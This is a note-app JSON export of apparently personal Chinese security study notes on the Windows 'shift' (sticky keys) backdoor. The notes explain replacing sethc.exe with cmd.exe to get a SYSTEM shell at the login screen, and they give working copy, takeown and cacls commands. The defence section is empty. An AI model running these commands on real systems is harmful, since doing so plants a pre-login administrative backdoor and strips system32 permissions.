{"ID":"20241031094603-eh5i6qz","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241031094603-eh5i6qz","title":"Windows后门","updated":"20241031103421"},"Children":[{"ID":"20241031094610-86brz0a","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031094610-86brz0a","updated":"20241031094638"},"Children":[{"Type":"NodeText","Data":"shift后门-老方式"}]},{"ID":"20241031094639-5v079df","Type":"NodeParagraph","Properties":{"id":"20241031094639-5v079df","updated":"20241031094713"},"Children":[{"Type":"NodeText","Data":"在winodws中有一些辅助功能，能在用户未登录系统之前就通过"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"组合键"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"来启动"}]},{"ID":"20241031094807-ndouq4z","Type":"NodeParagraph","Properties":{"id":"20241031094807-ndouq4z"}},{"ID":"20241031094807-wsurb6d","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241031094807-wsurb6d","updated":"20241031094815"},"Children":[{"Type":"NodeText","Data":"原理"}]},{"ID":"20241031094816-hfgotv6","Type":"NodeParagraph","Properties":{"id":"20241031094816-hfgotv6","updated":"20241031094904"},"Children":[{"Type":"NodeText","Data":"把cmd.exe这个程序更名为sethc.exe，并且把原来的sethc.exe替换掉。之后在登录界面连续按下5次shift键后，系统会以system权限运行cmd.exe。那么此时的 cmd.exe 就具有了管理权限，之后只要利用cmd增加一个管理员用户就可以登录进去，实现隐藏后门"}]},{"ID":"20241031094620-gdtqqvo","Type":"NodeParagraph","Properties":{"id":"20241031094620-gdtqqvo"}},{"ID":"20241031094603-q6y1fol","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241031094603-q6y1fol","updated":"20241031103106"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031103108-0xbllv4","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031103108-0xbllv4","updated":"20241031103126"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"copy C:\\WINDOWS\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe   //如果没指定生成的文件，会直接覆盖copy的第二个参数，相当于将第二个参数换成了第一个参数，但是文件外部名称没变\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031094950-b30pauv","Type":"NodeParagraph","Properties":{"id":"20241031094950-b30pauv","updated":"20241031103149"},"Children":[{"Type":"NodeText","Data":"在cmd窗口如果出现拒绝访问"}]},{"ID":"20241031103157-pzsspmb","Type":"NodeParagraph","Properties":{"id":"20241031103157-pzsspmb","updated":"20241031103421"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031103421-al7hjwr.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241031103158-0vqluhe","Type":"NodeParagraph","Properties":{"id":"20241031103158-0vqluhe","updated":"20241031103214"},"Children":[{"Type":"NodeText","Data":"解决方法：需要将目录下的所有目录和文件、子目录下的所有者更改为管理员组（administrators）命令，"}]},{"ID":"20241031103204-g1kf4te","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031103204-g1kf4te","updated":"20241031103224"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"takeown  /f  c:\\windows\\system32\\*.*  /a  /r  /d  y  # 获取整个文件夹及其下面子目录文件的所属权\ncacls c:\\windows\\system32\\*.* /T /E /G administrators:F # 将所有c:\\windows\\system32\\目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制(删除原有NTFS权限设置)\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031094950-acz7wjt","Type":"NodeParagraph","Properties":{"id":"20241031094950-acz7wjt"}},{"ID":"20241031094950-6c2s8l6","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241031094950-6c2s8l6","updated":"20241031094957"},"Children":[{"Type":"NodeText","Data":"防御"}]},{"ID":"20241031095006-8k9vjr6","Type":"NodeParagraph","Properties":{"id":"20241031095006-8k9vjr6"}},{"ID":"20241031095011-8tu24ky","Type":"NodeParagraph","Properties":{"id":"20241031095011-8tu24ky"}},{"ID":"20241031095011-3bb0ihk","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031095011-3bb0ihk"}}]}